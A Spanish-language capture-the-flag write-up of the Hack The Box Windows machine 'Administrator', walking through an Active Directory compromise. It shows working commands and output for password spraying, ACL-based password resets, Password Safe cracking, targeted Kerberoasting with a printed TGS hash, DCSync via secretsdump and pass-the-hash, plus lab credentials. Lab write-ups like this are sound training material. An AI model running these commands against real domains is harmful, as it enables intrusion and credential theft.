# Administrator

![](../../../../~gitbook/image.md)Publicado: 30 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
OS: Windows
###📝 Descripción
Administrator es una máquina Windows de dificultad media que simula un entorno corporativo con Active Directory. La máquina presenta un escenario realista donde comenzamos con credenciales válidas de un usuario de dominio y debemos explotar relaciones de confianza, permisos especiales y configuraciones débiles para escalar privilegios hasta obtener acceso como Administrador del dominio.El escenario involucra técnicas comunes de post-explotación en entornos AD como enumeración de usuarios, análisis de ACLs (Access Control Lists), movimiento lateral a través de cambios de contraseña, cracking de bases de datos de contraseñas, ataques de Kerberoasting dirigidos y finalmente un ataque DCSync para obtener los hashes del dominio.
###🎯 Puntos Clave
- Credenciales iniciales: `olivia:ichliebedich`
- Vector de ataque: Explotación de permisos GenericAll/GenericWrite en Active Directory
- Movimiento lateral: Cambios de contraseña mediante ACLs privilegiadas
- Escalada de privilegios: DCSync attack para obtener hash del Administrator
- Herramientas clave: BloodHound, netexec, bloodyAD, targetedKerberoast, impacket

###🔍 Información de la Máquina
AspectoDetalleIP10.10.11.42Dominioadministrator.htbControlador de DominioDCSistema OperativoWindows Server 2022 Build 20348Servicios PrincipalesFTP, DNS, Kerberos, LDAP, SMB, WinRM
###🔭 Reconocimiento

####🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
####🚀 Escaneo de puertos

####🔍 Enumeración de servicios
⚠️ Añadimos el siguiente vhost a nuestro fichero /etc/hosts:
####📋 Análisis de Servicios Detectados
PuertoServicioUso en el Ataque21FTPAcceso a archivos de backup con credenciales de Benjamin53DNSResolución de nombres del dominio88KerberosAutenticación y ataques de Kerberoasting389/3268LDAPEnumeración de usuarios y objetos del AD445SMBEnumeración de recursos compartidos y usuarios5985WinRMAcceso remoto con credenciales válidas
####🔑 Credenciales Iniciales
Como es común en las pruebas de penetración de Windows de la vida real, iniciará el cuadro de Administrador con las credenciales de la siguiente cuenta:- Nombre de usuario: Olivia
- Contraseña: ichliebedich

###🌐 Enumeración de Servicios

####🗂️ 445 SMB - Enumeración Inicial
Ya que disponemos de credenciales, comenzamos tratando de enumerar recursos compartidos, usuarios etc:![](../../../../~gitbook/image.md)
####👥 Enumeración de Usuarios del Dominio
Creamos una lista con los usuarios obtenidos:![](../../../../~gitbook/image.md)
####🎫 Verificación AS-Rep Roast
Verificamos si de los usuarios obtenidos hay alguno que tenga la pre-autenticación de kerberos deshabilitada y podamos obtener un ticket:❌ Resultado: Ningún usuario vulnerable a AS-Rep Roast
####🎯 Verificación Kerberoasting
Con la credencial de la que disponemos verificamos si hay alguna cuenta sobre la que podamos realizar un ataque de kerberoasting:❌ Resultado: No se encontraron SPNs para Kerberoasting convencional
####💧 Password Spraying
Verificamos si la contraseña de Olivia está siendo reutilizada por algún otro usuario del dominio:✅ Resultado: Solo Olivia usa esta contraseña, pero pertenece al grupo Remote Management
###🔓 Acceso Inicial

####💻 Conexión WinRM como Olivia
![](../../../../~gitbook/image.md)
####🏠 Enumeración de Usuarios Locales

###🩸 Análisis con BloodHound

####📊 Recolección de Datos del Dominio

####🎯 Identificación de Permisos Especiales
Tras cargar los resultados, observo que Olivia tiene control total (GenericAll) sobre el usuario Michael:![](../../../../~gitbook/image.md)
###🔄 Movimiento Lateral - Fase 1

####👤 Olivia → Michael (GenericAll)
Usamos bloodyAD para cambiar la contraseña de Michael usando las credenciales de Olivia:![](../../../../~gitbook/image.md)
####✅ Verificación de Acceso como Michael

###🔄 Movimiento Lateral - Fase 2

####👤 Michael → Benjamin (ForceChangePassword)
Volvemos a BloodHound para marcar Michael como Owned y descubrimos que Michael puede cambiar la contraseña del usuario Benjamin:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
####🚫 Limitaciones de Acceso de Benjamin
Benjamin no puede acceder vía WinRM ni tiene recursos interesantes en SMB:![](../../../../~gitbook/image.md)
###📁 Descubrimiento de Archivos Críticos

####📂 Acceso FTP como Benjamin
Sin embargo, Benjamin puede acceder al servicio FTP y encontramos un archivo crucial:![](../../../../~gitbook/image.md)
####🔐 Análisis del Archivo Password Safe

###🔨 Cracking de Password Safe

####⚡ Ataque de Fuerza Bruta con Hashcat
![](../../../../~gitbook/image.md)
####🗝️ Extracción de Credenciales
Usamos pwsafe para Linux para abrir el vault con la contraseña obtenida:![](../../../../~gitbook/image.md)
####📋 Credencial Descubierta
De los usuarios encontrados en el vault, identificamos que Emily era uno de los usuarios enumerados previamente:![](../../../../~gitbook/image.md)Credencial obtenida: `emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
###🔄 Movimiento Lateral - Fase 3

####👤 Acceso como Emily

####🚩 Primera Flag Obtenida

###🚀 Escalada de Privilegios

####🔍 Análisis de Permisos de Emily en BloodHound
Después de enumerar sin encontrar vías tradicionales de escalada, revisamos los ACLs de Emily en BloodHound:![](../../../../~gitbook/image.md)
####✍️ Explotación de GenericWrite
Emily tiene permisos GenericWrite sobre Ethan, lo que nos permite realizar un Targeted Kerberoasting Attack.
####🎯 Targeted Kerberoasting Attack
Usamos [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) para crear un SPN falso y obtener un TGS de Ethan:⚠️ Importante: Sincronizar relojes con ntpdate para evitar errores de Kerberos KRB_AP_ERR_SKEW
####🔓 Cracking del Ticket TGS
![](../../../../~gitbook/image.md)Credencial obtenida: `ethan:limpbizkit`
###👑 Compromiso Total del Dominio

####🔍 Análisis de Permisos de Ethan
Con Ethan comprometido, analizamos sus permisos en BloodHound:![](../../../../~gitbook/image.md)
####🎯 Permisos DCSync Identificados
Ethan posee los siguientes permisos críticos:- GetChangesInFilteredSet
- GetChangesAll
- GetChangesAll
Estos permisos permiten realizar un DCSync Attack para obtener todos los hashes del dominio.
####💎 Ejecución del DCSync Attack

####🏆 Acceso como Administrator
Finalmente usamos evil-winrm para realizar pass-the-hash y obtener acceso como Administrator:Last updated 9 months ago- [📝 Descripción](#descripcion)
- [🎯 Puntos Clave](#puntos-clave)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración de Servicios](#enumeracion-de-servicios-1)
- [🔓 Acceso Inicial](#acceso-inicial)
- [🩸 Análisis con BloodHound](#analisis-con-bloodhound)
- [🔄 Movimiento Lateral - Fase 1](#movimiento-lateral-fase-1)
- [🔄 Movimiento Lateral - Fase 2](#movimiento-lateral-fase-2)
- [📁 Descubrimiento de Archivos Críticos](#descubrimiento-de-archivos-criticos)
- [🔨 Cracking de Password Safe](#cracking-de-password-safe)
- [🔄 Movimiento Lateral - Fase 3](#movimiento-lateral-fase-3)
- [🚀 Escalada de Privilegios](#escalada-de-privilegios)
- [👑 Compromiso Total del Dominio](#compromiso-total-del-dominio)

```
❯ ping -c2 10.10.11.42
PING 10.10.11.42 (10.10.11.42) 56(84) bytes of data.
64 bytes from 10.10.11.42: icmp_seq=1 ttl=127 time=50.0 ms
64 bytes from 10.10.11.42: icmp_seq=2 ttl=127 time=45.9 ms

--- 10.10.11.42 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 45.944/47.985/50.027/2.041 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.100 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,62494,64634,64639,64642,64659
```

```
nmap -sC -sV -p$ports 10.10.11.42 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 19:54 CEST
Nmap scan report for 10.10.11.42
Host is up (0.042s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-01 00:54:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
62494/tcp open  msrpc         Microsoft Windows RPC
64634/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
64639/tcp open  msrpc         Microsoft Windows RPC
64642/tcp open  msrpc         Microsoft Windows RPC
64659/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-07-01T00:54:58
|_  start_date: N/A
```

```
echo "10.10.11.42 administrator.htb" | sudo tee -a /etc/hosts
```

```
netexec smb 10.10.11.42 -u 'Olivia' -p 'ichliebedich' --shares
```

```
netexec smb 10.10.11.42 -u 'Olivia' -p 'ichliebedich' --users
```

```
netexec smb 10.10.11.42 -u 'Olivia' -p 'ichliebedich' --rid-brute 2>/dev/null | awk -F '\\' '{print $2}' | grep 'SidTypeUser' | sed 's/ (SidTypeUser)//' > Users.txt
```

```
impacket-GetNPUsers -dc-ip 10.10.11.42 administrator.htb/ -usersfile Users.txt -format hashcat
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User olivia doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User michael doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User benjamin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User emily doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ethan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

```
impacket-GetUserSPNs administrator.htb/Olivia:'ichliebedich' -dc-ip administrator.htb -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

No entries found!
```

```
netexec smb 10.10.11.42 -u Users.txt -p 'ichliebedich' --continue-on-success
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [-] administrator.htb\Administrator:ichliebedich STATUS_LOGON_FAILURE
SMB         10.10.11.42     445    DC               [-] administrator.htb\Guest:ichliebedich STATUS_LOGON_FAILURE
SMB         10.10.11.42     445    DC               [-] administrator.htb\krbtgt:ichliebedich STATUS_LOGON_FAILURE
SMB         10.10.11.42     445    DC               [-] administrator.htb\DC$:ichliebedich STATUS_LOGON_FAILURE
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich
SMB         10.10.11.42     445    DC               [-] administrator.htb\michael:ichliebedich STATUS_LOGON_FAILURE
SMB         10.10.11.42     445    DC               [-] administrator.htb\benjamin:ichliebedich STATUS_LOGON_FAILURE
SMB         10.10.11.42     445    DC               [-] administrator.htb\emily:ichliebedich STATUS_LOGON_FAILURE
SMB         10.10.11.42     445    DC               [-] administrator.htb\ethan:ichliebedich STATUS_LOGON_FAILURE
SMB         10.10.11.42     445    DC               [-] administrator.htb\alexander:ichliebedich STATUS_LOGON_FAILURE
SMB         10.10.11.42     445    DC               [-] administrator.htb\emma:ichliebedich STATUS_LOGON_FAILURE
```

```
netexec winrm 10.10.11.42 -u Users.txt -p 'ichliebedich' --continue-on-success
```

```
evil-winrm -i 10.10.11.42 -u Olivia -p 'ichliebedich'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents> whoami
administrator\olivia
*Evil-WinRM* PS C:\Users\olivia\Documents>
```

```
*Evil-WinRM* PS C:\Users> dir

Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/22/2024  11:46 AM                Administrator
d-----        10/30/2024   2:25 PM                emily
d-----         6/30/2025   6:10 PM                olivia
d-r---         10/4/2024  10:08 AM                Public
```

```
bloodhound-python -u 'Olivia' -p 'ichliebedich' -d administrator.htb -c All --zip -ns 10.10.11.42
```

```
bloodyAD -u 'Olivia' -p 'ichliebedich' -d administrator.htb --dc-ip 10.10.11.42 set password Michael 'Password123!'
```

```
netexec winrm 10.10.11.42 -u Michael -p 'Password123!'
```

```
evil-winrm -i 10.10.11.42 -u Michael -p 'Password123!'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\michael\Documents> whoami
administrator\michael
```

```
bloodyAD -u 'Michael' -p 'Password123!' -d administrator.htb --dc-ip 10.10.11.42 set password Benjamin 'Password123!'
```

```
ftp benjamin@10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||64872|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||64874|)
125 Data connection already open; Transfer starting.
100% |******************************************************************************************************************************************|   952       17.30 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (16.96 KiB/s)
ftp>
```

```
file Backup.psafe3
Backup.psafe3: Password Safe V3 database
```

```
hashcat -m 5200 trilocor_svc_vault.psafe3 /usr/share/wordlists/rockyou.txt
```

```
evil-winrm -i 10.10.11.42 -u Emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> whoami
administrator\emily
```

```
*Evil-WinRM* PS C:\Users\emily\Desktop> dir

Directory: C:\Users\emily\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         6/30/2025   5:51 PM             34 user.txt
```

```
sudo ntpdate 10.10.11.42 && python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'Emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

```
sudo ntpdate 10.10.11.42 && python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'Emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
2025-07-01 04:03:57.957477 (+0200) +25200.298271 +/- 0.059382 10.10.11.42 s1 no-leap
CLOCK: time stepped by 25200.298271
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$9e6069b8d1319b6367c235251ddd63c7$1478a96fd56fa4a7b9ad159a65da1515c880618ed9fae5eb7f25b98f6cf4e674a81371951b524979046db988f0fd7ea474abdbe19efca081baa2551d5da66e01615be75d560c867efcb24c3d0b688e106039ab32324f7c444dfd6bcdf72ce3e1a87241175a5c29ccd3a6d823d5814f960cfa6aa36915f32d32164e09a6b227dad89e053178971bfa4d41cab5aa6806717732b388389c1dd8f3dee638af12d17cda4d7644c9b65b65580e5fc3db0a48bbc2db9ac8040ffc84cebf53549ee7c43045fa6565aa3e99d75a062d8e0caa368c5b5002301ba04674db6df8145242fd07bfe795ec7539c2a21ec639d82f5910980784e082beae2311af6a650604e2775b02d0d9fdcc859c8c137d34210909896462827362f1dccadac77a5679270b0f446c2faff4af6b687aa8506b96f90c32163c22bb0833ce94020178fbf9dc60ed8723ebc2ae63199d7e7001c87ae839c4802f9ef6c6e57470ded8c3d2380bc1814c8971bc0fbe08cddba24fb48dc9ef49591a52b739dda0de9471b04322634ed5cb1c89104131c28f0f93cdda959bfc876d220f12c0e55540704d57550e3f7f2cac2e6fcb04403f555230c9e340459bbc1ae0f70b19da09fd296d074448d74a857069e2f13ee46e1d1b373a5b75cb66ca7949e08c5288780d251ec361609b21896cb85b93b7a527b3297db8d80de6221cf91e65f7cc56c871949223d008d9948ed7d7835dc73aeb7a20b150cc608f80f29499c010a56481804f225f518f45b47b071cf9214d1f72689d4bbeca43c15a917c8738f4edcc63acf3caae002e6762e5517b1aeac6d6c65f5280d53894eca95b2a534fbb45aa26241280e53eebf74c5a556df3a3b7e0b8d1c6e08feb5f96364105f5ae464bcf3431e169de2f32b518a286f8b23b669d9873ce0e76a4f35a94be210e53ccfe2b306c23cf87d7b12f5f5c43127e5f924cd5ad44596025f75c7cee6377304a282a9c10b997c0002deda102351fd94a6afe854bc73d03c83bc41a8d4ed9feb1bfa40431ba4d1f75cd14a5efbff4a05798fb6849ea813b26871de9f6b0bab3199e689aeaf73575a96d8676edfd16e65f2621d4c8814db3e07b89cf208da8537567b90652311a464c07564345b13a0c330b55fcedbe1bbba56af02a3427880d10e5a480b5c19d9d067452ce23df748755da3a9bb03e187f609aa6d88202317d9f25181683e91961828dcb6c56f68ab097a9566b9ccf38f856be678eed1640a02243e7cfae6ea3c1c73337e240d70bc66d8e8acf84af76f53deb4055cbc1c02bfd8d6ff93c9f53cb871a23df5d01b0aab7e0fe6e7b8278868cf4b46ed3262e0dfcf2671c8ba74c2ad1afc8363200393d496a0bbc953ee6a9a649b0b0c18fc149aa9088fc9a52657815d2bf55efddd98925dec6b0af4251d078f608c8766d527c0c05c8fd1145432f572beaeb38123bc5e4c24ddbaaf0f1208c73cf33c1859b3edd6e6a31121bb7abb70075501b24a7f820597b59e86d6e53d3934c2fd28b79250fd1e65bd97750a2ce872e67b6
[VERBOSE] SPN removed successfully for (ethan)
```

```
hashcat -m 13100 -a 0 ethan_ticket /usr/share/wordlists/rockyou.txt
```

```
impacket-secretsdump ethan@10.10.11.42 -just-dc-user administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee::::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:
Administrator:aes128-cts-hmac-sha1-96:
Administrator:des-cbc-md5:403286f7cdf18385
[*] Cleaning up...
```

```
evil-winrm -i 10.10.11.42 -u Administrator -H ''

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
administrator\administrator
*Evil-WinRM* PS C:\Users\Administrator\
```
